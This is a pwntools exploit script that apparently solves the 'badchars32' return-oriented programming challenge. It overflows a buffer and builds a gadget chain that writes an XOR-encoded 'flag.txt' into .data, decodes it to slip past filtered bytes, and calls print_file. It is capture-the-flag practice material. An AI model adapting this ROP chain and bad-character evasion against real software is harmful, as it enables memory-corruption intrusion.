from pwn import *
import struct
import sys
import time

challenge = './badchars32'

elf = ELF(challenge)
function = elf.plt['print_file']
rop = ROP(elf)
xor = 0x08048547
writter = 0x0804854F # arbitrary write
str_addr = 0x0804A018 # This is in the .data section and we have

def xor_str(addr_str):
    payload = b''
    payload += p32(rop.ebx.address)
    payload += p32(0x02020202)
    for i in range(4):
        payload += p32(rop.ebp.address)
        payload += p32(addr_str + i)
        payload += p32(xor)
    return payload


load = elf.symbols['usefulGadgets']
rop = ROP(elf)
print(rop.ebp)
 
payload = cyclic(44)
payload += p32(rop.esi.address)
payload += b'dnce'
payload += p32(str_addr) # This is in the .data section and we have 
payload += p32(str_addr)
payload += p32(writter)
payload += xor_str(str_addr)
payload += p32(rop.esi.address)
payload += b',vzv'
payload += p32(str_addr + 4)
payload += p32(str_addr + 4)
payload += p32(writter)
payload += xor_str(str_addr + 4)
payload += p32(elf.plt['print_file'])
payload += p32(str_addr)
payload += p32(str_addr)

io = process(challenge)
# io = gdb.debug(challenge, gdbscript='''
# 		br *pwnme+273
# 		c
# 		x/20x $sp
# 		''')

print(io.recvuntil(b'> '))
print(rop.gadgets)

io.sendline(payload)
io.interactive()